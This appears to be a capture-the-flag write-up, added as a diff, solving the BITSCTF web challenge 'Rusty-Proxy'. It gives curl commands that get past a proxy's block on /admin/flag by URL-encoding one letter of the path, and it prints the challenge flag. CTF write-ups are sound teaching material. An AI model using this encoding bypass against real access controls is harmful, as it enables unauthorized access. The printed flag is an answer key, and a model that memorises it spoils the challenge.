@@ -1,0 +1,74 @@
+Challenge name: 
+Rusty-Proxy 
+Easy 
+Category: Web
+
+Challenge:
+http://rusty-proxy.chals.bitskrieg.in:25001
+
+Goal:
+Get the flag from the protected admin route.
+
+What you need:
+- A terminal
+- `curl`
+
+--------------------------------------------------
+Step 1) Check that the server is alive
+--------------------------------------------------
+Run:
+`curl -i http://rusty-proxy.chals.bitskrieg.in:25001/`
+
+You should see `HTTP/1.1 200 OK` and JSON like:
+`{"endpoints":["/","/api/status"],"version":"1.0.0"}`
+
+This confirms the challenge is reachable.
+
+--------------------------------------------------
+Step 2) Test the obvious admin route (it should be blocked)
+--------------------------------------------------
+Run:
+`curl -i http://rusty-proxy.chals.bitskrieg.in:25001/admin/flag`
+
+You should see:
+- `HTTP/1.1 403 Forbidden`
+- Body: `Access denied.`
+
+So direct access is blocked by the proxy.
+
+--------------------------------------------------
+Step 3) Try path-encoding bypass
+--------------------------------------------------
+Now send `admin` with one encoded character:
+
+Run:
+`curl -i "http://rusty-proxy.chals.bitskrieg.in:25001/ad%6din/flag"`
+
+Why this works (short version):
+- `%6d` is the letter `m`
+- So `ad%6din` becomes `admin`
+- The proxy check misses it, but backend resolves it as `/admin/flag`
+
+--------------------------------------------------
+Step 4) Read the flag from response
+--------------------------------------------------
+Expected successful output includes:
+- `HTTP/1.1 200 OK`
+- JSON with `"flag":"..."`
+
+Flag:
+`BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}`
+
+--------------------------------------------------
+One-liner solve
+--------------------------------------------------
+`curl -s "http://rusty-proxy.chals.bitskrieg.in:25001/ad%6din/flag"`
+
+This should directly print the JSON containing the flag.
+
+--------------------------------------------------
+If it fails temporarily
+--------------------------------------------------
+Sometimes CTF infra is unstable. Retry the same command a few times:
+
+`for i in {1..5}; do curl -s "http://rusty-proxy.chals.bitskrieg.in:25001/ad%6din/flag"; echo; done`
